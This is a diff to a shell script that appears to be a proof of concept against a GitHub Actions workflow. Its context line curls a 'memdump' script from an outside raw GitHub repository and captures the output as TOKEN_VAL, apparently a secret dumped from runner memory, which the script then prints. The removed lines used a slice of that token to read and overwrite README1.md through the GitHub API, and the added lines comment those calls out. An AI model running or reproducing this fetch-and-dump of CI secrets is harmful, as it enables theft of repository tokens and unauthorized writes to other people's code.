@@ -8,23 +8,25 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
-T2=${TOKEN_VAL:41:80} 
-echo "$T2"
-echo "---------------------------3--------------------------------------"
+#T2=${TOKEN_VAL:41:80} 
+#echo "$T2"
 echo "$TOKEN_VAL" | sed 's/[^a-zA-Z0-9]//g'
-curl \
-    -H "Accept: application/vnd.github.v3+json" \
-    -H "Authorization: token $T2" \
-    -H "X-GitHub-Api-Version: 2022-11-28" \
-    --url "https://api.github.com/repos/${REPO}/contents/README1.md" \
+echo "---------------------------3--------------------------------------"
+
+#echo "$TOKEN_VAL" | sed 's/[^a-zA-Z0-9]//g'
+#curl \
+#    -H "Accept: application/vnd.github.v3+json" \
+#    -H "Authorization: token $T2" \
+#    -H "X-GitHub-Api-Version: 2022-11-28" \
+#    --url "https://api.github.com/repos/${REPO}/contents/README1.md" \
     
-curl \
-    -X PUT \
-    -H "Accept: application/vnd.github.v3+json" \
-    -H "Authorization: token $T2" \
-    -H "X-GitHub-Api-Version: 2022-11-28" \
-    --url "https://api.github.com/repos/${REPO}/contents/README1.md" \
-    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
+#curl \
+#    -X PUT \
+#    -H "Accept: application/vnd.github.v3+json" \
+#    -H "Authorization: token $T2" \
+#    -H "X-GitHub-Api-Version: 2022-11-28" \
+#    --url "https://api.github.com/repos/${REPO}/contents/README1.md" \
+#    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'
 
 #curl "https://api.github.com/repos/${REPO}/contents/README.md"      
 
